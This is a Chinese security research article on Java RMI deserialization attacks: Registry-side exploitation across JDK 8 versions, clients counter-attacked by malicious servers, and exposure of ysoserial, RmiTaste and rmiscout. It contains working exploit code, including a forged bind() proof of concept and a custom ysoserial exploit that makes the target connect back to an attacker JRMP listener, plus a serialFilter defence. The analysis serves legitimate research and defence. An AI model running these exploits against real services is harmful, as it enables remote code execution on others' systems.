阅读本文需要具有一定的RMI基础。基础相关可参考 [这篇文章](https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html)。

本文将会介绍如下内容：

1. JDK8u232以下版本的JDK Registry端反序列化问题
2. RMI Client端被Server端打反序列化的问题
3. 分析RMI相关工具 `ysoserial exp`、`rmitaste`和`rmiscout`是否有被反制的可能。

调试RMI
=====

**环境:jdk 8**

工欲善其事必先利其器，在开始分析之前，需要先了解如何调试RMI。

由于RMI存在 Client、Server、Registry端。Client端比较好调试，只要下断点跟进调用的方法即可（`bind()`, `lookup()` 这些）。但是 Server端却不太好调试。毕竟 `LocateRegistry.createRegistry()` 的操作是**新开线程等待连接**，我们不大可能往 `LocateRegistry.createRegistry()` 上打断点逐步跟进调试。

最佳的方法是把断点下在 `rt.jar`的 `sun/rmi/server/UnicastServerRef#dispatch`中。rmi Server的起点就在这里。并且调试时最好**Client和Server分开两个项目运行**。

**示例:**

```java
Registry registry = LocateRegistry.createRegistry(1099);
Naming.lookup("rmi://127.0.0.1:1099/myserver1");
```

打断点后Debug，可以发现成功Attach

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f1ab9fb2c4c4b489586edda48a6080d8c4d97387.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f1ab9fb2c4c4b489586edda48a6080d8c4d97387.png)

左下角的 Debugger栏中还可以选择调试线程。目前调试的是 RMI Server的线程。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e7965d2b3d1a1ed46f12a54c8313531f0503fd8a.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e7965d2b3d1a1ed46f12a54c8313531f0503fd8a.png)

了解怎么调试 RMI后，就可以开始 RMI 反序列化问题的探讨了。

攻击 Registry(&lt; JDK8u121)
==========================

了解过RMI基础就会知道，RMI其实分为了三个部分:Registry, Server, Client

**Demo:**

*Server.java*

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception{
        Registry registry = LocateRegistry.createRegistry(1099);
        MyRmiServiceImpl myRmiService = new MyRmiServiceImpl();
        registry.bind("myRmiService", myRmiService);
    }
}
```

*MyRmiService.java*

```java
import java.rmi.Remote;
import java.rmi.RemoteException;

public interface MyRmiService extends Remote {
    public void hello() throws RemoteException;
}
```

*MyRmiServiceImpl.java*

```java
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class MyRmiServiceImpl extends UnicastRemoteObject implements MyRmiService {
    public MyRmiServiceImpl() throws RemoteException {
    }

    public void hello() throws RemoteException {
        System.out.println("[Server] hello");
    }
}
```

*Client.java*

```java
import java.rmi.Naming;

public class Client {

    public static void main(String[] args) throws Exception {
        MyRmiServiceImpl myRmiService = new MyRmiServiceImpl();
        Naming.bind("rmi://192.168.232.1:1099/myRmiService", myRmiService);
    }
}
```

Client端的bind
------------

Client端bind`Remote对象`一般都使用 `Naming.bind()`。跟进如下:

*java/rmi/Naming*

```java
public static void bind(String name, Remote obj){
    ParsedNamingURL parsed = parseURL(name);
    Registry registry = getRegistry(parsed);

    if (obj == null)
        throw new NullPointerException("cannot bind to null");

    registry.bind(parsed.name, obj);
}
```

观察代码可以知道，`Naming#bind()`帮我们解析传入的rmi协议字符串，并根据`host`和`port`创建Registry的实例。

跟进 `registry.bind()` 操作。由于是 客户端执行的 `bind()`，所以此时调用的 `bind()`是Stub的`bind()`。

*rt.jar!/sun/rmi/registry/RegistryImpl\_Stub*

```java
public void bind(String var1, Remote var2) {
    try {
        //获得一个RemoteCall。用于RMI请求的发送
        RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L);

        try {
            //序列化写入要bind的Remote对象
            ObjectOutput var4 = var3.getOutputStream();
            var4.writeObject(var1);
            var4.writeObject(var2);
        } catch (IOException var5) {
            throw new MarshalException("error marshalling arguments", var5);
        }
        //调用RemoteCall发送RMI bind请求
        super.ref.invoke(var3);
        super.ref.done(var3);
    }
    ....
}
```

由此得知，`Remote对象`被写入到了`RemoteCall对象`中，并发送了RMI请求。下面来看看Registry端接收到bind请求后如何处理的。

Registry端的bind
--------------

低版本的JDK（忘了多低了，不过也不重要）RMI并没有强制要求Registry和Server必须在同一主机上，所以是允许远程主机向Registry进行`bind()`操作的。可是后来RMI在`RegistryImpl#bind()`方法中**添加了主机验证**，即下图中的 `checkAccess()`，只能是本地主机向Registry发起`bind()`请求。

*rt.jar!/sun/rmi/registry/RegistryImpl*

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-47d96618aab383cfa807b966f2706d6bbf0a19a7.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-47d96618aab383cfa807b966f2706d6bbf0a19a7.png)

检测的调用栈如下，感兴趣可以自行调试下。

```java
<init>:47, BindException (java.net)
bind0:-1, DualStackPlainSocketImpl (java.net)
socketBind:106, DualStackPlainSocketImpl (java.net)
bind:387, AbstractPlainSocketImpl (java.net)
bind:190, PlainSocketImpl (java.net)
bind:375, ServerSocket (java.net)
```

虽说 `RegistryImpl#bind()` 使用了`checkAccess()`。但是观察调用栈可知，进入 `RegistryImpl#bind()` 前还有几次函数调用。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6dc1a7b67e9627a3df376874ee4119167a83b622.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6dc1a7b67e9627a3df376874ee4119167a83b622.png)

进入 `RegistryImpl_Skel#dispatch()` 进行查看，代码如下:

```java
//这里的var2,var3都是Client端bind()请求发送的数据。下文会分析客户端如何发送bind()请求
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) {
    ObjectInput var11;
    switch(var3) {
        case 0:
            try {
                //由于RMI是使用反序列化传送类的
                //这里需要反序列化操作
                var11 = var2.getInputStream();
                //反序列化类名
                var7 = (String)var11.readObject();
                //反序列化Remote对象
                var8 = (Remote)var11.readObject();
            }
            .....
            //反序列化结束后才判断Client端是否本机
            var6.bind(var7, var8);
        .....
    }
}
```

可以发现，在调用 `RegistryImpl#bind()` 之前就已经对客户端发来数据进行反序列化了。我们的目标就是触发到这个反序列化。只要触发到反序列化，后面就算 `checkAccess()` 限制了IP也没有关系。

攻击面
---

### 使用对象代理,AnnotationInvocationHandler打CC1

综上所述，Registry端会反序列化Client发来的`Remote对象`。但由于`Naming.bind()`接收 的bind对象类型只能是 `Remote对象`。想直接打反序列化链子是不行的，因为这些链子的入口类都没有实现`Remote接口`，连`Naming.bind()`都没法正常执行。

怎么办呢？[参考文章](https://www.anquanke.com/post/id/197829)中给出的解决办法是用对象代理。步骤如下:

1. 对象代理实现`Remote接口`，以便`Naming.bind()`正常发送
2. `AnnotationInvocationHandler`是CC1的入口，我们可以让对象代理使用该`InvocationHandler`
3. 如此一来我们便可依赖`AnnotationInvocationHandler`打CC1了

这里直接参考 ysoserial 的 **exploit/RMIRegistryExploit** 即可，不详细展开。

### 仿写Naming.bind()，发送任意类型的对象

对象代理有限制的地方就是必须要找到一个能打exp的`InvocationHandler`。所以不太适配所有反序列化链子。

研究一阵发现，只是Client端 `Naming.bind()` 参数必须接受一个Remote对象，编译不通过而已。若我们仿写一个 `Naming.bind()` ，强制将对象发出，理论上就能发送任意反序列化链子了。

**poc:**

```java
//HashMap payload
HashMap hashMap = new HashMap<>();

//仿写的 Naming#bind()
LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                              new TCPEndpoint("127.0.0.1", 1099, null, null),
                              false);
UnicastRef unicastRef = new UnicastRef(liveRef);
RegistryImpl_Stub registryImpl_stub = new RegistryImpl_Stub();
Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};

//第三个参数 0 表示 bind 请求
RemoteCall remoteCall = unicastRef.newCall(registryImpl_stub, operations, 0, 4905912898345647071L);

//序列化 payload 对象
ObjectOutput outputStream = remoteCall.getOutputStream();
outputStream.writeObject(hashMap);

//发送RMI请求
unicastRef.invoke(remoteCall);
```

POC其实就是照着 `Naming#bind()` 仿写了一波。RMI地址在`TCPEndpoint`中指定。

**实现效果如下**:

Registry端在`HashMap#readObject`打上断点，发送POC，可在Registry端的 `HashMap#readObject` 成功断下断点。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7469e2ba6d78d3af8cbb00c4297c47c2ccb32a3d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-7469e2ba6d78d3af8cbb00c4297c47c2ccb32a3d.png)

当然这个POC可以自己整到ysoserial里头，配合里面的链子来打。这里就不展开了。

攻击 Registry(JDK8u121 &lt;= &amp; &lt; jdk8u242-b07)
===================================================

这些jdk版本中不能使用前文用的bind来攻击Registry端了，原因如下:

1. **RMI Registry的`bind()`先检测来源ip再反序列化，导致远端攻击失效。**

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) {
    .....
    switch(var3) {
        case 0:
            //先检测来源IP，若不是本地直接block
            RegistryImpl.checkAccess("Registry.bind");
            try {
                var9 = var2.getInputStream();
                var7 = (String)var9.readObject();
                var80 = (Remote)var9.readObject();
            }
            .....
            var6.bind(var7, var80);
    }
}
```

2. **由于JEP290的加入，导致RMI Server端在反序列化Stub发送的数据时，使用白名单机制进行了类检测，阻断了恶意类的直接反序列化。**

**关于RMI的白名单机制:**

在 *rt.jar!/sun/rmi/server/UnicastServerRef* 中， `oldDispatch()`方法在调用`dispatch()`前先调用了 `unmarshalCustomCallData()`方法

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-347c44943bec739557a4035ce5bef7158e1c2895.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-347c44943bec739557a4035ce5bef7158e1c2895.png)

`unmarshalCustomCallData()`方法如下，该方法的主要目的是为反序列化注册一个`Filter`。

```java
protected void unmarshalCustomCallData(ObjectInput var1) throws IOException, ClassNotFoundException {
        //设置反序列化白名单。至于 AccessController 和 setObjectInputFilter是啥可以参考文末给出的链接
        AccessController.doPrivileged(new PrivilegedAction<Void>() {
            public Void run() {
                //这里的 UnicastServerRef.this.filter 就是 RegistryImpl的实例
                Config.setObjectInputFilter(var2, UnicastServerRef.this.filter);
                return null;
            }
        });
}
```

最终会在 `sun/rmi/registry/RegistryImpl#registryFilter()` 进行过滤。主要逻辑如下:

*如果嫌IDEA反编译class的代码长得丑，可以看这个[在线源码](http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/75f31e0bd829/src/share/classes/sun/rmi/registry/RegistryImpl.java) 的。*

```java
if (String.class == clazz
    || java.lang.Number.class.isAssignableFrom(clazz)
    || Remote.class.isAssignableFrom(clazz)
    || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)
    || UnicastRef.class.isAssignableFrom(clazz)
    || RMIClientSocketFactory.class.isAssignableFrom(clazz)
    || RMIServerSocketFactory.class.isAssignableFrom(clazz)
    || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)
    || java.rmi.server.UID.class.isAssignableFrom(clazz)) {
    return ObjectInputFilter.Status.ALLOWED;
} else {
    return ObjectInputFilter.Status.REJECTED;
}
```

虽然`Proxy类`是允许的，可是`InvokerHandler`等类却不在白名单中，所以直接发反序列化payload是不成的。

如何破局，只能把注意点转移到白名单中的类。下面直接放exp，然后再慢慢解释每个东西都是干嘛的。

自定义开发ysoserial 配合 exploit/JRMPServer 攻击 RMI Server
--------------------------------------------------

下面我们需要自定义开发ysoserial，并且使用`ysoserial`中内置的`exploit/JRMPServer`来帮助我们完成攻击。

在攻击之前，需要先了解一些ysoserial相关的知识。

### Ysoserial相关

项目地址：<https://github.com/frohoff/ysoserial>

`payload`目录下的都是反序列化的payload。

`exploit`目录下的都是执行攻击使用的exp

假设我们想自定义一个exp，但反序列化payload懒得自己写了，想用ysoserial现成的。如何拿ysoserial里的反序列化payload呢？定位到`payloads`目录下，可以发现这些反序列化payload都有一个 `getObject()`函数:

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6c6634978ccbd8da56dcaf45bf28abc42f6bd52d.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-6c6634978ccbd8da56dcaf45bf28abc42f6bd52d.png)

我们想拿到某个反序列化payload直接调用对应的`getObject()`即可。

### 自定义 ysoserial exp

被攻击的**Server端**代码同前文的Demo。

**下面直接先上手写Exp。待Exp能完成攻击后再慢慢分析原理。**

该Exp需要用到`payloads/JRMPClient`的反序列化Payload。但是原本的`payloads/JRMPClient`payload返回的是`Registry`类型作payload，需要让其返回类型为`RemoteObjectInvocationHandler`。最佳方式是在源代码的基础上新增一个函数，用于返回我们需要的对象类型。具体为什么需要`RemoteObjectInvocationHandler`类型的payload，**后面会细说**

*JRMPClient.java如下，新增一个函数 getRemoteObjectInvocationHandler*

```java
.....
public class JRMPClient extends PayloadRunner implements ObjectPayload<Registry> {
public RemoteObjectInvocationHandler getRemoteObjectInvocationHandler(final String command){
    String host;
    int port;
    int sep = command.indexOf(':');
    if ( sep < 0 ) {
        port = new Random().nextInt(65535);
        host = command;
    }
    else {
        host = command.substring(0, sep);
        port = Integer.valueOf(command.substring(sep + 1));
    }
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    return obj;
}
.....
```

在`ysoserial/exploit`下新建一个exp。命名随意，这里命名为`Pan_RMIExp1`，如下所示。该exp的主要作用是发起一个`lookup()`请求并携带`RemoteObjectInvocationHandler`：

```java
package ysoserial.exploit;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.exploit.PanDomain.RemoteStubTmp;

import java.io.IOException;
import java.io.ObjectOutput;
import java.lang.reflect.Proxy;
import java.rmi.MarshalException;
import java.rmi.Remote;
import java.rmi.server.*;

public class Pan_RMIExp1 {
    public static void main(String[] args) throws Exception{
        String host = args[0];
        int port = Integer.parseInt(args[1]);
        String evilServer = args[2];
       exp1(host, port, evilServer);
    }

    public static void exp1(String host,int port, String evilServer) throws Exception{
        Operation[] operations = new Operation[]{new Operation("void bind(java.lang.String, java.rmi.Remote)"), new Operation("java.lang.String list()[]"), new Operation("java.rmi.Remote lookup(java.lang.String)"), new Operation("void rebind(java.lang.String, java.rmi.Remote)"), new Operation("void unbind(java.lang.String)")};

        LiveRef liveRef =
            new LiveRef(new ObjID(ObjID.REGISTRY_ID),
                new TCPEndpoint(host, port, null, null),
                false);
        UnicastRef unicastRef = new UnicastRef(liveRef);

        ysoserial.payloads.JRMPClient jrmpClient = new ysoserial.payloads.JRMPClient();
        RemoteObjectInvocationHandler remoteObjectInvocationHandler = jrmpClient.getRemoteObjectInvocationHandler(evilServer);
        Remote r = (Remote) Proxy.newProxyInstance(
            Remote.class.getClassLoader(),
            new Class[]{Remote.class},
            remoteObjectInvocationHandler
        );

        RemoteStub remoteStubTmp = new RemoteStubTmp();
        RemoteCall remoteCall = unicastRef.newCall(remoteStubTmp, operations, 2, 4905912898345647071L);

        try {
            ObjectOutput var3 = remoteCall.getOutputStream();
            var3.writeObject(r);
        } catch (IOException var17) {
            throw new MarshalException("error marshalling arguments", var17);
        }
        unicastRef.invoke(remoteCall);
    }
}
```

**操作流程:**

1. 使用 ysoserial 的 `exploit/JRMPListener` 开启恶意RMI Server。参数输入为 `7771 URLDNS http://pipi.7z0fpi.dnslog.cn`

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3b39d138cfcd03683b3b873daee0fc57c0e1fab8.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-3b39d138cfcd03683b3b873daee0fc57c0e1fab8.png)

2. 开启服务端的RMI Server
3. 利用刚刚编写的exp对普通服务端发起攻击请求。参数输入为 `127.0.0.1 1099 127.0.0.1:7771`

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-93c275ea407d86d52251ffe4d9e51f6d9d8ed596.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-93c275ea407d86d52251ffe4d9e51f6d9d8ed596.png)

发送攻击后，被攻击的Server端可在 `HashMap#readObject` 处断点。并且dnslog也有记录。

### 攻击流程

攻击流程走一遍后不难发现。流程如图所示:

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-4a191061dd783c93e2b1d5cefe8457b793dab670.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-4a191061dd783c93e2b1d5cefe8457b793dab670.png)

明白基本的流程后，按照上图的流程来解释这个exp咋写的。解释时只说关键点，自己动手跟跟其实就能理解的了。

### p1: payload1是如何构造的

翻看的代码，不难发现其仿写了 RMI 的请求代码。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-189bc4f7079e9e221c18bfc4be231f073e81f495.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-189bc4f7079e9e221c18bfc4be231f073e81f495.png)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b20b8e67c76955e69deaec7305964bf958cc1339.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b20b8e67c76955e69deaec7305964bf958cc1339.png)

1. `UnicastRef`用于发送RMI请求，而`LiveRef`用于配置`UnicastRef`的请求地址
2. 通过对象代理准备一个`Remote对象`，其`InvocationHandler`为`RemoteObjectInvocationHandler`。这个`InvocationHandler`在`registryFilter`的白名单中。为`RemoteObjectInvocationHandler`设置了*evilServer*的地址。
3. 配置`UnicastRef`，`newCall()`的第三个参数 2 表示是 `lookup()`请求。为什么要用lookup请求呢？前文说过jdk8u较高版本bind请求检测了来源IP，但是lookup却没有。
4. 至于为什么要手工仿写一个lookup请求，因为自带的`Naming.lookup`只能发`String类型`的对象，也由于`Naming类`是`final`的没法继承重写，所以这里便手工仿写一个。

### p2: 为什么Server会反连Evil Server

当此exp发送到Server端时，会走到 `RegistryImpl_Skel#dispatch` 的 `case 2`，也就是Server处理lookup请求的地方。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e9568f692dcf29d2c406cb0a7546c7130f7811cb.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-e9568f692dcf29d2c406cb0a7546c7130f7811cb.png)

走过`readObject()`后，程序会来到 `RemoteObject#readObject`，`RemoteObject`是`RemoteObjectInvocationHandler`父类。

跟进 `ref.readExternal(in);`，经过如下调用:

```java
UnicastRef#readExternal
    LiveRef#read
```

在`LiveRef#read`中，用反序列化还原了 `RemoteObjectInvocationHandler`。我们在exp为 `RemoteObjectInvocationHandler` 配置的*evilServer*的地址就顺利的赋值给 `LiveRef var5`，并返回。返回后会赋值给 `UnicastRef.ref`。若后续程序有调用`UnicastRef.ref#invoke` ，则可反连*evilServer*。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c5d2a327cfcca573f7f90139b1702014e478e4be.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-c5d2a327cfcca573f7f90139b1702014e478e4be.png)

后续调用 `UnicastRef.ref#invoke`的入口就在 `RegistryImpl_Skel#dispatch` 中:

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b612b2963a7643c2cbc6e1a695e85b11602a22d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-b612b2963a7643c2cbc6e1a695e85b11602a22d3.png)

触发 `UnicastRef.ref#invoke` 的调用栈为:

```java
dirty:109, DGCImpl_Stub (sun.rmi.transport)
makeDirtyCall:382, DGCClient$EndpointEntry (sun.rmi.transport)
registerRefs:324, DGCClient$EndpointEntry (sun.rmi.transport)
registerRefs:160, DGCClient (sun.rmi.transport)
registerRefs:102, ConnectionInputStream (sun.rmi.transport)
releaseInputStream:157, StreamRemoteCall (sun.rmi.transport)
dispatch:113, RegistryImpl_Skel (sun.rmi.registry)
oldDispatch:468, UnicastServerRef (sun.rmi.server)
dispatch:300, UnicastServerRef (sun.rmi.server)
```

在此处开始反连*evilServer*。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-be28b4eb460afa106eed57326c4592d1f48e408b.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-be28b4eb460afa106eed57326c4592d1f48e408b.png)

### p3: Evil Server作用

这个会在下节 "Client端被反序列化攻击" 进行一定的分析，现在只需要知道 ysoserial`exploit/JRMPListener`的作用就是发送反序列化payload，并且设置一个关键的字节。这个关键字节下文会说。

### p4: Server为何会反序列化payload2

接着p3的流程，跟进`UnicastRef#invoke` ，其调用了 `StreamRemoteCall#executeCall`。这个函数简单抽象如下:

```java
public void executeCall() {
    .....
    var1 = this.in.readByte();
    switch(var1) {
        case 1:
           return;
        case 2:
           var14 = this.in.readObject();
        ......
    }
}
```

var1是根据evilServer发来的数据反序列化的来的。得是2才能进入反序列化。普通的RMI Server在这里都是返回的1。前文p3说的 "*ysoserial`exploit/JRMPListener`的作用就是发送反序列化payload，并且设置一个关键的字节* " 其实就是这个字节。

Server作为Client反连*evilServer*的调用栈中并没有设置`序列化Filter`，所以在这个阶段就能正常打反序列化payload了。

直接攻击Registry被限制(&gt;= jdk8u242-b07)
===================================

在`jdk8u242-b07`这一版本里，可以发现在`dispatch()`中不再直接`readObject()`反序列化Client端数据，而是采用`readString()`的形式避免了直接反序列化。[在线源码](https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/034a65a05bfb/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java)

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9fd262ddad4f7ebdf1fc25dee4cd9a903ade0245.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-9fd262ddad4f7ebdf1fc25dee4cd9a903ade0245.png)

所以目前来说，暂时无法通过Client端直接发送payload给Registry端进行攻击了。

Client端被反序列化攻击
==============

由于RMI通信时，所有数据对象都是序列化传输的。所以Client端被反序列化攻击也不足为奇。

本节的Demo中Server端同前文的Demo。Client端代码如下:

```java
import java.rmi.Naming;
import java.rmi.Remote;

public class Client {
    public static void main(String[] args) throws Exception {
        Remote lookup = Naming.lookup("rmi://192.168.232.1:1099/myRmiService");
    }
}
```

仅仅只是做了一个`lookup()`操作。Debug调试时可以发现，在`sun.rmi.registry.RegistryImpl_Stub#lookup`处，请求完Registry后就对回传数据进行反序列化:

```java
public Remote lookup(String var1){
     StreamRemoteCall var2 = (StreamRemoteCall)this.ref.newCall(this, operations, 2, 4905912898345647071L);
     .....
     //发起RMI请求
     this.ref.invoke(var2);

    //反序列化Registry端数据
    ObjectInput var4 = var2.getInputStream();
    var20 = (Remote)var4.readObject();
    ....
}
```

前文分析攻击Registry时并没有详细分析Registry如何包装数据返回的，如何自定义这些数据，这一部分值得分析。

在`sun.rmi.registry.RegistryImpl_Skel#dispatch`中，`switch()`判断了Client端发来的`opnum`后，代码如下:

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4){
    .....
    RegistryImpl var6 = (RegistryImpl)var1;
    StreamRemoteCall var7 = (StreamRemoteCall)var2;
    switch(var3) {
        .....
        case 2:
            //获取Client 想要lookup的服务名
            var9 = (ObjectInputStream)var7.getInputStream();
            var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);

            //根据服务名拿到真实的Remote Object对象
            var81 = var6.lookup(var8);

            //获取对象输出流
            ObjectOutput var83 = var7.getResultStream(true);
            //将Remote Object对象写到对象输出流中
            var83.writeObject(var81);
            ....
}
```

最后Reigstry端会将这些对象输出流回传给Client。完成一个RMI `lookup()`请求。

分析后可知，Registry端将`Remote Object对象`封装进`RemoteCall`的对象输出流中，若我们自己仿写一个恶意Registry端，那是不是所有来`lookup()`恶意Registry端的Client都会被攻击呢？

确实是这样，ysoserial中就有一个叫`exploit/JRMPServer`的exp，前文我们也用过它来打过"作为Client端的Registry"。不过它打Client端的反序列化点并不是在`sun.rmi.registry.RegistryImpl_Stub#lookup`，而是在`sun.rmi.transport.StreamRemoteCall#executeCall`。调用栈为:

```java
executeCall:270, StreamRemoteCall (sun.rmi.transport)
invoke:379, UnicastRef (sun.rmi.server)
lookup:123, RegistryImpl_Stub (sun.rmi.registry)
lookup:101, Naming (java.rmi)
```

代码如下：

```java
public void executeCall() {
    .....
    this.getInputStream();
    var1 = this.in.readByte();

    switch(var1) {
        .....
        case 2:
            Object var14;
            try {
                var14 = this.in.readObject();
            }
        .....
    }
}
```

所以，当RMI Client端对`exploit/JRMPServer`开启的RMI Server发起了RMI请求，将会被反制。

RMI相关工具浅析
=========

既然Client端会被Server端反打，那那些利用RMI作攻击的工具是否存在被反制的风险呢？下面来简单看看。

在测试之前，先把ysoserial的`exploit/JRMPListener`起来以便后续测试。

ysoserial - exploit/RMIRegistryExploit
--------------------------------------

该Exp会在`main()`中对RMI Registry进行`list()`操作：

```java
public static void main(final String[] args) throws Exception {
    .....
    // test RMI registry connection and upgrade to SSL connection on fail
    try {
        registry.list();
    }
    ....
}
```

而`list()`操作会调用`UnicastRef#invoke`，这个调用点正好是前文分析"Client端被反序列化攻击"中，Client端被打的调用链。所以该Exp存在被Server端反制的风险。

贴个调用栈:

```java
readObject:431, ObjectInputStream (java.io)
executeCall:252, StreamRemoteCall (sun.rmi.transport)
invoke:375, UnicastRef (sun.rmi.server)
list:86, RegistryImpl_Stub (sun.rmi.registry)
main:59, RMIRegistryExploit (ysoserial.exploit)
```

RmiTaste
--------

该工具项目地址如下，项目的ReadMe已经说的很清楚了：

<https://github.com/STMCyber/RmiTaste>

主要用于RMI服务的探测、枚举和攻击。下面来看看使用该工具是否会被Server端反制。

### connect模式

该模式用于探测目标是否存在RMI服务，其核心原理是使用了`RegistryImpl_Stub#list`来探测：

*m0.rmitaste.rmi.RmiTarget#getRegistryUnencrypted*

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f47e7a9a16e81becd22e1e597d61737671351e8c.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f47e7a9a16e81becd22e1e597d61737671351e8c.png)

前文也说过，`list()`操作最终会使用`UnicastRef#invoe`。该函数会导致Client端被反序列化攻击。

触发到这的调用栈：

```java
getRegistryUnencrypted:31, RmiTarget (m0.rmitaste.rmi)
getRegistry:61, RmiTarget (m0.rmitaste.rmi)
connect:82, RmiTarget (m0.rmitaste.rmi)
connect:43, Enumerate (m0.rmitaste.rmi.exploit)
call:33, ConnectionCommand (m0.rmitaste.commands)
call:15, ConnectionCommand (m0.rmitaste.commands)
executeUserObject:1933, CommandLine (picocli)
access$1100:145, CommandLine (picocli)
executeUserObjectOfLastSubcommandWithSameParent:2332, CommandLine$RunLast (picocli)
handle:2326, CommandLine$RunLast (picocli)
handle:2291, CommandLine$RunLast (picocli)
execute:2159, CommandLine$AbstractParseResultHandler (picocli)
execute:2058, CommandLine (picocli)
main:48, RmiTaste (m0.rmitaste)
```

### 其他模式

RmiTaste的其他模式（enum、attack、call）都需要使用`Enumerate#connect`进行调用。而该方法正好在上文分析的触发反序列化的链子中。所以，RmiTaste工具也存在被反制的风险。更何况RmiTaste需要依赖ysoserial，所以我们完全可以对RmiTaste打各种反序列化链。

rmiscout
--------

该工具项目地址如下，项目的ReadMe已经说的很清楚了：

<https://github.com/BishopFox/rmiscout>

主要用爆破RMI服务，猜测其对应的方法签名。主要攻击手段是RMI Remote Object的反序列化。

rmiscout的所有模式（Wordlist、Bruteforce、Exploit、Invoke、Probe）都需要使用 `RMIConnector#RMIConnector`对RMI发起连接，核心逻辑就是调用`RegistryImpl_Stub#list`，前面说过该方法会导致Client端被反序列化攻击。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1a42b038580523e349290eef16fe1d9cb2b0def4.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-1a42b038580523e349290eef16fe1d9cb2b0def4.png)

防御反制
----

我们可以通过设置反序列化白名单/黑名单的方式，确保自己的Payload成功发送且不会反序列化恶意Server端发来的payload。

第一步，创建一个`java.security.policy`文件，如下：

*policy.txt*

```properties
grant {
    permission java.security.AllPermission "*";
};
```

第二步，运行工具时开启`java.security.manager`，指定policy文件，设置反序列化Filter。`serialFilter`的黑名单列表需要自行设置，可以设置为一些反序列化链的类。

下面演示仅使用URLDNS做证明，所以阻止序列化的类为`java.net.URL`

*命令*

```shell
java -Djava.security.manager -Djava.security.policy=D:\work\java\tools\policy.txt -Djdk.serialFilter=!java.net.URL -jar rmiscout-1.4-SNAPS HOT-all.jar list 127.0.0.1 1099
```

对于正常的RMI服务，可以正常使用：  
[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a8eb489109b91f3d377ce389be9ef1240eb9ee2e.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-a8eb489109b91f3d377ce389be9ef1240eb9ee2e.png)

对于恶意RMI Server，由于反序列化Filter的机制，可对工具进行保护。

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f6b0191d11224337e1c0e6a83c0241776c0fe1e7.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-f6b0191d11224337e1c0e6a83c0241776c0fe1e7.png)

若探测恶意RMI Server时不加保护，将会被反制：

[![](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-548d05ce3c3119ac35e4cab5101b22db646589b8.png)](https://shs3.b.qianxin.com/attack_forum/2021/09/attach-548d05ce3c3119ac35e4cab5101b22db646589b8.png)

Reference
=========

[浅谈Java RMI Registry安全问题](https://www.anquanke.com/post/id/197829)

[ysoserial JRMP相关模块分析（二）- payloads/JRMPClient &amp; exploit/JRMPListener](https://xz.aliyun.com/t/2650)

[AccessController](https://docs.oracle.com/javase/8/docs/api/java/security/AccessController.html)

[serialization-filtering](https://docs.oracle.com/javase/10/core/serialization-filtering1.htm)